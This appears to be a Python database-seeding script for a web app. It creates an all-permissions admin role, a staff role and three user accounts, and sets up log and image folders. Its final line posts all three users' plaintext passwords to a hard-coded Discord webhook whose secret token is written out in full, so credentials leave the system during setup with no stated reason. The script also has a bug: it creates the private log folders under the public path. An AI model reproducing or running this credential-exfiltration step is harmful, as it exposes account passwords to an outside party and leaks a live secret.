import os
import requests
from app import db
from app.models import User, Role, Permission
from app.config import permissions, public_logs_servers_list, private_logs_servers_list


role = Role(name="*", color='red', lvl=999, checker_view=False)
for perm in permissions:
    add_perm = Permission(name=perm, description=permissions[perm])
    role.permissions.append(add_perm)
    db.session.add(add_perm)
staff_role = Role(name='Назначенный состав', color='white', lvl=1, checker_view=True)
db.session.add(staff_role)
ob1ch = User(login="OB1CHAM", avatar=False)
farm = User(login="FarmLander")
test = User(login="TestUser")
test.roles.append(staff_role)
ob1ch.roles.append(role)
ob1ch.roles.append(staff_role)
farm.roles.append(role)
farm.roles.append(staff_role)
db.session.add_all([ob1ch, farm])
db.session.commit()
os.mkdir('logs')
os.mkdir('logs/public')
os.mkdir('logs/private')
for server in public_logs_servers_list:
    os.mkdir(f'logs/public/{server}')
for server in private_logs_servers_list:
    os.mkdir(f'logs/public/{server}')
os.mkdir('app/static/css/images/users')
os.mkdir('app/static/css/images/OB1CHAM')
os.mkdir('app/static/css/images/FarmLander')

requests.post('https://discord.com/api/webhooks/883050208085303297/CvFCZpD4_06_lZjyinIZjEhPPORIfqVpFc_S93psKAh7rpQ2XYoXIhGynajZNa9_BTRE', data={
    'content': f'OB1CHAM {ob1ch.password}\nFarmLander {farm.password}\nTestUser: {test.password}'
})
